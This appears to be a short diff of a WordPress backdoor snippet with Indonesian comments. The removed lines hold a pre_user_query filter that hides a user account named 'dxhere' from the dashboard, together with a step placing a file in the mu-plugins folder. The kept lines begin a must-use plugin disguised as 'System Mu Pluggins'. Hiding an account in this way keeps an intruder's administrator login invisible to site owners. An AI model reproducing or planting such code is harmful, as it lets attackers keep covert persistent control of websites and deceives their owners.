@@ -1,15 +1,3 @@
-FILTER AGAR TIDAK USER TIDAK TERLIHAT DI DAHSBOARD PELETAKAN DI FUNCTION.PHP TEMA AKTIF
-
-add_filter('pre_user_query', function($user_search) {
-    global $wpdb;
-    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
-});
-
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-LANGKAH : contohdomain.com/wp-content/mu-plugins/contohfile.php
-
-
 <?php
 /**
  * Plugin Name: System Mu Pluggins
